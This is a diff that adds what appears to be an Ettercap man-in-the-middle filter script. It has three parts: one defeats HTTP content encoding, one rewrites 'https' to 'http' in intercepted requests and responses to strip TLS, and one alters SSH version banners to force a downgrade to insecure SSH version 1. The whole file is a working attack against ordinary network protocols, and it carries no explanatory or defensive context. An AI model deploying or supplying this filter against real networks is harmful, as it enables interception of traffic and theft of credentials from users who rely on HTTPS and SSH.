@@ -1,0 +1,56 @@
+      
+    ##########################  
+    ## Zap Content Encoding ##  
+    ##########################  
+    if (ip.proto == TCP && tcp.dst == 80) {  
+       if (search(DATA.data, "Accept-Encoding")) {  
+          replace("Accept-Encoding", "Accept-Rubbish!");  
+   # msg("[HTTP Response Filter] Encoding zapped.\n");  
+       }  
+    }  
+      
+    #####################  
+    ## Replace Content ##  
+    #####################  
+      
+    ##  
+    # Requests  
+    if (ip.proto == TCP && tcp.dst == 80) {  
+    #   msg("[HTTP Response Filter] HTTP request seen.\n");  
+       if (search(DECODED.data, "https")){  
+          replace("https", "http");  
+       }  
+       if (search(DATA.data, "https")){  
+          replace("https", "http");  
+       }  
+    }  
+      
+    ##  
+    # Response  
+    if (ip.proto == TCP && tcp.src == 80) {  
+     #  msg("[HTTP Response Filter] HTTP response seen.\n");  
+       if (search(DECODED.data, "https")){  
+          replace("https", "http");  
+       }  
+       if (search(DATA.data, "https")){  
+          replace("https", "http");  
+       }  
+    } 
+
+#Change SSH
+if (ip.proto == TCP) {
+   if (tcp.src == 22) {
+      if ( replace("SSH-1.99", "SSH-1.51") ) {
+      #   msg("[SSH Filter] SSH downgraded from version 2 to 1\n");
+      } else {
+         if ( search(DATA.data, "SSH-2.00") ) {
+       #     msg("[SSH Filter] Server supports only SSH version 2\n");
+         } else {
+            if ( search(DATA.data, "SSH-1.51") ) {
+        #       msg("[SSH Filter] Server already supports only version 1\n");
+            }
+         }
+      }
+   }
+}
+	
